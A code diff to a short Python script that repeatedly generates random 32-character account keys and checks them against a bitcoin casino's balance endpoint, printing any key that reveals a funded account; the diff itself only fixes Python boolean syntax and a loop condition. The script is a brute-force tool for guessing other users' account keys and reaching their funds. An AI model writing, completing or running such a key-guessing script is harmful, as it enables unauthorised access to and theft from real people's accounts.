@@ -7,12 +7,12 @@ import requests
 
 chars = 32
 times = 1
-accountEmpty = true
+accountEmpty = True
 
 d = 'abcdefghijklmnopqrstuvwxyz1234567890'
 word = ''
 letter = ''
-while (accountEmpty):
+while accountEmpty:
  while times > 0:
     for i in range(chars):
         letter = d[random.randint(0, len(d) -1)]
@@ -21,7 +21,7 @@ while (accountEmpty):
     data = response.json()
     if "balance" in data:
      print("https://bitcoinvideocasino.com/account/balance?account_key=" + word + " Balance: " + balance)
-     accountEmpty = false
+     accountEmpty = False
     else:
      print(data)
     word = ''
